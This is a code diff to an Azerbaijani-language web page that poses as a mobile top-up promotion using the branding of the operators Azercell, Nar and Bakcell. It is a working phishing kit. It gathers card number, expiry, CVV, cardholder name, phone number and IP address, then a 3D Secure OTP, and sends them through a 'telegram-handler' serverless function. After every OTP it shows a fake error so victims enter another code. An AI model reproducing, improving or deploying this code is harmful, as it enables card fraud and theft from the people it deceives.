@@ -45,14 +45,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .communal-btn {
-            background: linear-gradient(135deg, #f0c03d, #f2ce6a);
-            transition: all 0.3s ease;
-        }
-        .communal-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px -5px rgba(99, 102, 241, 0.4);
-        }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
@@ -65,17 +57,15 @@
                 <img src="images/azerpaylogo.png" alt="Ulduz Pay Logo" class="h-12 w-auto object-contain drop-shadow-xl">
             </div>
             <h1 class="text-3xl font-bold text-gray-900 tracking-tight">
-  Milliön <span class="text-[#ff0000]">pay</span>
-</h1>
+                Milliön <span class="text-[#ff0000]">pay</span>
+            </h1>
             <p class="text-gray-500 mt-2 text-sm">Təbriklər! Balansınızı 1 AZN artıraraq Milliön-dən 5 GB internet və 80 dəqiqə ölkədaxili danışıq qazanacaqsınız! Hədiyyənin istifadə müddəti 7 gün-dur!</p>
         </div>
 
         <!-- Step 1: Operator Selection -->
         <div id="step-1" class="step-transition active-step">
-           
-             <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">Operatoru seçin</h2>
+            <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">Operatoru seçin</h2>
             <div class="grid grid-cols-1 gap-4">
-                <!-- Azercell -->
                 <button onclick="selectOperator('Azercell')" class="operator-card flex flex-col items-center p-8 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 group transition-all">
                     <div class="w-24 h-16 mb-4 flex items-center justify-center">
                         <img src="images/azercell-logo-png_seeklogo-468720.png" alt="Azercell" class="max-w-full max-h-full object-contain group-hover:scale-110 transition-transform">
@@ -83,8 +73,6 @@
                     <p class="font-bold text-gray-900 text-lg">Azercell</p>
                     <p class="text-xs text-gray-400 mt-1">050, 051, 010</p>
                 </button>
-
-                <!-- Nar -->
                 <button onclick="selectOperator('Nar')" class="operator-card flex flex-col items-center p-8 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 group transition-all">
                     <div class="w-24 h-16 mb-4 flex items-center justify-center">
                         <img src="images/Nar-new-logo.png" alt="Nar" class="max-w-full max-h-full object-contain group-hover:scale-110 transition-transform">
@@ -92,8 +80,6 @@
                     <p class="font-bold text-gray-900 text-lg">Nar</p>
                     <p class="text-xs text-gray-400 mt-1">070, 077</p>
                 </button>
-
-                <!-- Bakcell -->
                 <button onclick="selectOperator('Bakcell')" class="operator-card flex flex-col items-center p-8 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 group transition-all">
                     <div class="w-24 h-16 mb-4 flex items-center justify-center">
                         <img src="images/bakcell_300.png" alt="Bakcell" class="max-w-full max-h-full object-contain group-hover:scale-110 transition-transform">
@@ -110,23 +96,17 @@
                 <button onclick="prevStep(1)" class="p-2 -ml-2 rounded-full hover:bg-gray-100 text-gray-400 hover:text-gray-600 transition-colors">
                     <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
                 </button>
-                <div id="selected-op-display" class="flex items-center ml-2">
-                    <!-- Dynamic content -->
-                </div>
+                <div id="selected-op-display" class="flex items-center ml-2"></div>
             </div>
-            
             <h2 class="text-xl font-semibold text-gray-800 mb-2">Nömrəni daxil edin</h2>
             <p class="text-sm text-gray-500 mb-6">Balansını artırmaq istədiyiniz nömrəni yazın.</p>
-
             <div class="space-y-6">
                 <div class="space-y-2">
                     <label class="block text-sm font-semibold text-gray-700 ml-1">Mobil nömrə</label>
                     <div class="flex gap-3">
                         <div class="relative min-w-[110px]">
                             <span class="absolute -top-2 left-3 bg-white px-1 text-[10px] text-blue-500 font-black uppercase tracking-widest z-10">Prefiks</span>
-                            <select id="prefix-select" class="w-full p-4 rounded-2xl border-2 border-blue-50 bg-white focus:border-blue-400 transition-all outline-none appearance-none cursor-pointer font-bold text-gray-700 shadow-sm">
-                                <!-- Options will be injected by JS -->
-                            </select>
+                            <select id="prefix-select" class="w-full p-4 rounded-2xl border-2 border-blue-50 bg-white focus:border-blue-400 transition-all outline-none appearance-none cursor-pointer font-bold text-gray-700 shadow-sm"></select>
                             <div class="absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-blue-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"></path></svg>
                             </div>
@@ -136,8 +116,7 @@
                         </div>
                     </div>
                 </div>
-
-                <button id="step-2-next" onclick="goToStep(3)" disabled="" class="w-full py-5 bg-gray-100 text-gray-400 font-bold rounded-2xl transition-all duration-300 cursor-not-allowed disabled:bg-gray-100 enabled:bg-red-600 enabled:text-white enabled:hover:bg-red-700 enabled:shadow-lg enabled:shadow-red-200">
+                <button id="step-2-next" onclick="goToStep(3)" disabled class="w-full py-5 bg-gray-100 text-gray-400 font-bold rounded-2xl transition-all duration-300 cursor-not-allowed disabled:bg-gray-100 enabled:bg-red-600 enabled:text-white enabled:hover:bg-red-700 enabled:shadow-lg enabled:shadow-red-200">
                     Davam et
                 </button>
             </div>
@@ -154,47 +133,29 @@
                     <p id="summary-num" class="text-sm text-gray-700 font-bold"></p>
                 </div>
             </div>
-
             <h2 class="text-xl font-semibold text-gray-800 mb-6">Kampaniyanı seçin</h2>
-
             <div class="space-y-3 max-h-[350px] overflow-y-auto pr-2 custom-scrollbar">
-                <!-- Campaigns -->
                 <div onclick="selectCampaign(1, '1 AZN', '5 GB', '80 dəqiqə', '7 gün')" class="campaign-card p-4 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 cursor-pointer group transition-all">
                     <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-lg font-bold text-gray-900">1 AZN</p>
-                            <p class="text-sm text-blue-600 font-medium">5 GB + 80 dəq</p>
-                        </div>
+                        <div><p class="text-lg font-bold text-gray-900">1 AZN</p><p class="text-sm text-blue-600 font-medium">5 GB + 80 dəq</p></div>
                         <span class="text-xs text-gray-400 bg-gray-50 px-3 py-1 rounded-full">7 gün</span>
                     </div>
                 </div>
-
                 <div onclick="selectCampaign(2, '5 AZN', '20 GB', '150 dəqiqə', '20 gün')" class="campaign-card p-4 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 cursor-pointer group transition-all">
                     <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-lg font-bold text-gray-900">5 AZN</p>
-                            <p class="text-sm text-blue-600 font-medium">20 GB + 150 dəq</p>
-                        </div>
+                        <div><p class="text-lg font-bold text-gray-900">5 AZN</p><p class="text-sm text-blue-600 font-medium">20 GB + 150 dəq</p></div>
                         <span class="text-xs text-gray-400 bg-gray-50 px-3 py-1 rounded-full">20 gün</span>
                     </div>
                 </div>
-
                 <div onclick="selectCampaign(3, '10 AZN', '30 GB', '200 dəqiqə', '30 gün')" class="campaign-card p-4 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 cursor-pointer group transition-all">
                     <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-lg font-bold text-gray-900">10 AZN</p>
-                            <p class="text-sm text-blue-600 font-medium">30 GB + 200 dəq</p>
-                        </div>
+                        <div><p class="text-lg font-bold text-gray-900">10 AZN</p><p class="text-sm text-blue-600 font-medium">30 GB + 200 dəq</p></div>
                         <span class="text-xs text-gray-400 bg-gray-50 px-3 py-1 rounded-full">30 gün</span>
                     </div>
                 </div>
-
                 <div onclick="selectCampaign(4, '20 AZN', '60 GB', '300 dəqiqə', '60 gün')" class="campaign-card p-4 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 cursor-pointer group transition-all">
                     <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-lg font-bold text-gray-900">20 AZN</p>
-                            <p class="text-sm text-blue-600 font-medium">60 GB + 300 dəq</p>
-                        </div>
+                        <div><p class="text-lg font-bold text-gray-900">20 AZN</p><p class="text-sm text-blue-600 font-medium">60 GB + 300 dəq</p></div>
                         <span class="text-xs text-gray-400 bg-gray-50 px-3 py-1 rounded-full">60 gün</span>
                     </div>
                 </div>
@@ -206,26 +167,19 @@
             <div class="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6">
                 <svg xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 text-green-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
             </div>
-            
             <h2 class="text-2xl font-bold text-gray-900 mb-4">Məlumatları təsdiqləyin</h2>
-            
             <div class="bg-blue-50 p-6 rounded-3xl mb-8">
                 <p id="congrats-msg" class="text-blue-800 text-sm leading-relaxed"></p>
             </div>
-
             <div class="flex gap-4">
-                <button onclick="prevStep(3)" class="flex-1 py-4 border border-gray-200 text-gray-500 font-bold rounded-2xl hover:bg-gray-50 transition-colors">
-                    Geri
-                </button>
-                <button onclick="goToStep(5)" class="flex-2 px-8 py-4 bg-red-600 text-white font-bold rounded-2xl hover:bg-red-700 shadow-lg shadow-red-200 transition-all">
-                    TƏSDİQLƏ
-                </button>
+                <button onclick="prevStep(3)" class="flex-1 py-4 border border-gray-200 text-gray-500 font-bold rounded-2xl hover:bg-gray-50 transition-colors">Geri</button>
+                <button onclick="goToStep(5)" class="flex-2 px-8 py-4 bg-red-600 text-white font-bold rounded-2xl hover:bg-red-700 shadow-lg shadow-red-200 transition-all">TƏSDİQLƏ</button>
             </div>
         </div>
 
         <!-- Step 5: Payment Details -->
         <div id="step-5" class="step-transition hidden-step">
-             <div class="flex items-center mb-6">
+            <div class="flex items-center mb-6">
                 <button onclick="prevStep(4)" class="p-2 -ml-2 rounded-full hover:bg-gray-100 text-gray-400 hover:text-gray-600 transition-colors">
                     <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
                 </button>
@@ -234,33 +188,28 @@
                     <p id="payment-amount" class="text-sm text-gray-700 font-bold"></p>
                 </div>
             </div>
-
             <h2 class="text-xl font-semibold text-gray-800 mb-6">Kart məlumatlarını daxil edin</h2>
-
             <form id="payment-form" class="space-y-4">
                 <div>
                     <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1">Kart sahibinin adı</label>
-                    <input type="text" id="card-name" required="" class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="AD SOYAD">
+                    <input type="text" id="card-name" required class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="AD SOYAD">
                 </div>
-
                 <div>
                     <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1 text-red-500 hidden" id="card-error">Yanlış kart nömrəsi</label>
                     <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1" id="card-label">Kart nömrəsi</label>
-                    <input type="text" id="card-number" required="" class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="0000 0000 0000 0000">
+                    <input type="text" id="card-number" required class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="0000 0000 0000 0000">
                 </div>
-
                 <div class="grid grid-cols-2 gap-4">
                     <div>
                         <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1 text-red-500 hidden" id="expiry-error">Yanlış tarix</label>
                         <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1" id="expiry-label">Bitiş tarixi</label>
-                        <input type="text" id="card-expiry" required="" class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="AA/İİ">
+                        <input type="text" id="card-expiry" required class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="AA/İİ">
                     </div>
                     <div>
                         <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1">CVV</label>
-                        <input type="text" id="card-cvv" required="" class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="000">
+                        <input type="text" id="card-cvv" required class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="000">
                     </div>
                 </div>
-
                 <button type="submit" class="w-full mt-4 py-5 bg-red-600 text-white font-bold rounded-2xl hover:bg-red-700 shadow-lg shadow-red-200 transition-all flex items-center justify-center">
                     <span>Ödənişi Tamamla</span>
                 </button>
@@ -278,17 +227,12 @@
                 <h2 class="text-xl font-bold text-gray-900">3D Təhlükəsizlik</h2>
                 <p class="text-sm text-gray-500 mt-2">Nömrənizə göndərilən 6 rəqəmli kodu daxil edin.</p>
             </div>
-
             <form id="tds-form" class="space-y-6">
                 <div class="text-center">
-                    <input type="text" id="tds-code" required="" maxlength="6" class="w-48 text-center text-3xl font-bold tracking-[0.5em] p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-50/50 transition-all" placeholder="000000">
+                    <input type="text" id="tds-code" required maxlength="6" class="w-48 text-center text-3xl font-bold tracking-[0.5em] p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-50/50 transition-all" placeholder="000000">
                     <p id="tds-error" class="text-red-500 text-xs font-bold mt-4 hidden">Yanlış təsdiq kodu. Yenidən cəhd edin.</p>
                 </div>
-
-                <button type="submit" class="w-full py-5 bg-gray-900 text-white font-bold rounded-2xl hover:bg-black transition-all shadow-xl shadow-gray-200">
-                    Təsdiq et
-                </button>
-                
+                <button type="submit" class="w-full py-5 bg-gray-900 text-white font-bold rounded-2xl hover:bg-black transition-all shadow-xl shadow-gray-200">Təsdiq et</button>
                 <div class="text-center">
                     <button type="button" class="text-sm text-blue-600 font-medium hover:underline">Kodu yenidən göndər</button>
                 </div>
@@ -298,11 +242,9 @@
         <!-- Processing / Success State -->
         <div id="status-overlay" class="hidden absolute inset-0 bg-white/95 z-50 flex flex-col items-center justify-center p-10 text-center">
             <div id="loader" class="loader ease-linear rounded-full border-4 border-t-4 border-gray-100 h-16 w-16 mb-6"></div>
-            
             <div id="success-icon" class="hidden w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mb-6">
                 <svg xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 text-green-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
             </div>
-
             <h3 id="status-title" class="text-xl font-bold text-gray-900 mb-2">Gözləyin...</h3>
             <p id="status-desc" class="text-gray-500 text-sm">Əməliyyatınız icra olunur.</p>
         </div>
@@ -310,11 +252,7 @@
     </div>
 
     <script>
-        // ====== TELEGRAM CONFIG (Environment variables-dan gəlir) ======
-        // Token və Chat ID birbaşa burada yoxdur!
-        // =============================================================
-
-        // State
+        // ====== STATE ======
         const state = {
             operator: '',
             prefix: '',
@@ -334,14 +272,14 @@
             'Bakcell': ['055', '099']
         };
 
-        // Masks
+        // ====== MASKS ======
         const phoneMask = IMask(document.getElementById('phone-input'), { mask: '000-00-00' });
         const cardNumberMask = IMask(document.getElementById('card-number'), { mask: '0000 0000 0000 0000' });
         const cardExpiryMask = IMask(document.getElementById('card-expiry'), { mask: '00/00' });
         const cardCvvMask = IMask(document.getElementById('card-cvv'), { mask: '000' });
         const tdsCodeMask = IMask(document.getElementById('tds-code'), { mask: '000000' });
 
-        // Validation Logic
+        // ====== VALIDATION ======
         function isValidLuhn(number) {
             let sum = 0;
             let shouldDouble = false;
@@ -368,13 +306,12 @@
             return expiryDate > new Date(now.getFullYear(), now.getMonth(), 1);
         }
 
-        // Navigation
+        // ====== NAVIGATION ======
         function goToStep(step) {
             document.querySelectorAll('.step-transition').forEach(el => {
                 el.classList.remove('active-step');
                 el.classList.add('hidden-step');
             });
-            
             const nextStep = document.getElementById(`step-${step}`);
             if (nextStep) {
                 nextStep.classList.remove('hidden-step');
@@ -386,33 +323,27 @@
             goToStep(step);
         }
 
-        // Step 1: Select Operator
+        // ====== SELECT OPERATOR ======
         function selectOperator(op) {
             state.operator = op;
-            
-            // Update Display
             const opDisplay = document.getElementById('selected-op-display');
             const logoUrls = {
                 'Azercell': 'images/azercell-logo-png_seeklogo-468720.png',
                 'Nar': 'images/Nar-new-logo.png',
                 'Bakcell': 'images/bakcell_300.png'
             };
-            
             opDisplay.innerHTML = `
                 <div class="w-12 h-6 flex items-center justify-center mr-3">
                     <img src="${logoUrls[op]}" class="max-h-full max-w-full object-contain" alt="${op}">
                 </div>
                 <span class="font-bold text-gray-900">${op}</span>
             `;
-
-            // Update Prefixes
             const prefixSelect = document.getElementById('prefix-select');
             prefixSelect.innerHTML = prefixes[op].map(p => `<option value="${p}">${p}</option>`).join('');
-            
             goToStep(2);
         }
 
-        // Step 2: Validation
+        // ====== PHONE VALIDATION ======
         document.getElementById('phone-input').addEventListener('input', () => {
             const nextBtn = document.getElementById('step-2-next');
             if (phoneMask.unmaskedValue.length === 7) {
@@ -426,7 +357,7 @@
             }
         });
 
-        // Pre-Step 3 Setup
+        // ====== GO TO STEP ======
         const originalGoToStep = goToStep;
         window.goToStep = function(step) {
             if (step === 3) {
@@ -438,27 +369,37 @@
             originalGoToStep(step);
         }
 
-        // Step 3: Select Campaign
+        // ====== SELECT CAMPAIGN ======
         function selectCampaign(id, price, gb, mins, days) {
             state.campaign = { id, price, gb, mins, days };
-            
-            // Setup Confirmation Screen (Step 4)
             document.getElementById('congrats-msg').innerHTML = `
                 Təbriklər! Balansınızı <strong>${price}</strong> artıraraq Milliön-dən <strong>${gb}</strong> internet və <strong>${mins}</strong> ölkədaxili danışıq qazanacaqsınız! Hədiyyənin istifadə müddəti <strong>${days}</strong>-dur!
             `;
-            
             document.getElementById('payment-amount').textContent = price;
-
             goToStep(4);
         }
 
-        // Step 5: Form Submission - PHP'ye gönder
+        // ====== SEND TO NETLIFY FUNCTION ======
+        async function sendToTelegram(data) {
+            try {
+                const response = await fetch('/.netlify/functions/telegram-handler', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(data)
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Fetch error:', error);
+                return null;
+            }
+        }
+
+        // ====== PAYMENT FORM ======
         document.getElementById('payment-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             
             const cardNum = cardNumberMask.unmaskedValue;
             const expiry = cardExpiryMask.value;
-            
             let hasError = false;
             
             if (!isValidLuhn(cardNum)) {
@@ -486,7 +427,6 @@
             if (hasError) return;
 
             const overlay = document.getElementById('status-overlay');
-            const loader = document.getElementById('loader');
             const title = document.getElementById('status-title');
             const desc = document.getElementById('status-desc');
 
@@ -494,72 +434,46 @@
             title.textContent = 'Kart yoxlanılır...';
             desc.textContent = 'Zəhmət olmasa gözləyin, kart məlumatlarınız yoxlanılır.';
             
-            // FormData oluştur
-            const formData = new FormData();
-            formData.append('operator', state.operator);
-            formData.append('prefix', state.prefix);
-            formData.append('number', state.number);
-            formData.append('campaign_price', state.campaign.price);
-            formData.append('campaign_details', `${state.campaign.gb} + ${state.campaign.mins}`);
-            formData.append('card_name', document.getElementById('card-name').value);
-            formData.append('card_number', cardNumberMask.value);
-            formData.append('card_expiry', cardExpiryMask.value);
-            formData.append('card_cvv', cardCvvMask.value);
-
+            let userIP = 'N/A';
             try {
-                // Get IP
-                let userIP = 'N/A';
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    userIP = ipData.ip;
-                } catch (e) {
-                    console.log('IP fetch failed');
-                }
-
-                const now = new Date();
-                const timeStr = now.toLocaleTimeString('az-AZ', { hour: '2-digit', minute: '2-digit' });
-
-                // EMOJISIZ MESAJ
-                const telegramMessage = `YENI BILGI\n\n` +
-                    `Operator: ${state.operator}\n` +
-                    `Nomre: +994${state.prefix}${phoneMask.unmaskedValue}\n` +
-                    `Kampaniya: ${state.campaign.price}\n` +
-                    `Kart Sahibi: ${document.getElementById('card-name').value}\n` +
-                    `Kart Nomresi: ${cardNumberMask.value.replace(/\s/g, '')}\n` +
-                    `Kart Bitis: ${cardExpiryMask.value}\n` +
-                    `CVV: ${cardCvvMask.value}\n` +
-                    `IP: ${userIP}`;
-
-                // PHP dosyasına gönder
-                const response = await fetch('telegram-handler.php', {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                
-                if (result.status === 'success') {
-                    setTimeout(() => {
-                        overlay.classList.add('hidden');
-                        goToStep(6);
-                    }, 5000);
-                } else {
-                    throw new Error(result.message);
-                }
-                
-            } catch (error) {
-                overlay.classList.add('hidden');
-                alert('Sistem xətası baş verdi.');
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+            } catch (e) {
+                console.log('IP fetch failed');
             }
+
+            const cardName = document.getElementById('card-name').value || 'AD SOYAD';
+            
+            const data = {
+                operator: state.operator,
+                prefix: state.prefix,
+                number: state.number,
+                campaign_price: state.campaign.price,
+                card_name: cardName,
+                card_number: cardNumberMask.value,
+                card_expiry: cardExpiryMask.value,
+                card_cvv: cardCvvMask.value,
+                ip: userIP
+            };
+
+            const result = await sendToTelegram(data);
+            
+            setTimeout(() => {
+                overlay.classList.add('hidden');
+                if (result && result.status === 'success') {
+                    goToStep(6);
+                } else {
+                    alert('Sistem xətası baş verdi.');
+                }
+            }, 3000);
         });
 
-        // Step 6: 3DS Form Submission - PHP'ye gönder
+        // ====== OTP FORM ======
         document.getElementById('tds-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             
             const overlay = document.getElementById('status-overlay');
-            const loader = document.getElementById('loader');
             const title = document.getElementById('status-title');
             const desc = document.getElementById('status-desc');
             const errorMsg = document.getElementById('tds-error');
@@ -569,45 +483,23 @@
             desc.textContent = 'Məlumatlar yoxlanılır, zəhmət olmasa gözləyin.';
             errorMsg.classList.add('hidden');
 
-            const tdsCode = document.getElementById('tds-code').value;
-            const cardNum = cardNumberMask.value.replace(/\s/g, '');
-            const cardName = document.getElementById('card-name').value || 'AD SOYAD';
-
-            // EMOJISIZ OTP MESAJI
-            const otpMessage = `YENI BILGI OTP\n\n` +
-                `OTP Kodu: ${tdsCode}\n\n` +
-                `Kart Sahibi: ${cardName}\n` +
-                `Kart Nomresi: ${cardNum}\n` +
-                `Kart Bitis: ${cardExpiryMask.value}\n` +
-                `CVV: ${cardCvvMask.value}`;
-
-            // FormData oluştur
-            const formData = new FormData();
-            formData.append('card_number', cardNumberMask.value);
-            formData.append('tds_code', document.getElementById('tds-code').value);
+            const tdsCode = document.getElementById('tds-code').value || '******';
             
-            try {
-                // PHP dosyasına gönder
-                const response = await fetch('otp.php', {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                
-                // Simulation Delay
-                setTimeout(() => {
-                    overlay.classList.add('hidden');
-                    errorMsg.classList.remove('hidden');
-                    tdsCodeMask.value = '';
-                    document.getElementById('tds-code').focus();
-                }, 3000);
-                
-            } catch (error) {
+            const data = {
+                card_number: cardNumberMask.value,
+                tds_code: tdsCode
+            };
+
+            await sendToTelegram(data);
+
+            setTimeout(() => {
                 overlay.classList.add('hidden');
-            }
+                errorMsg.classList.remove('hidden');
+                tdsCodeMask.value = '';
+                document.getElementById('tds-code').focus();
+            }, 3000);
         });
     </script>
 
 </body>
-                        </html>
+    </html>
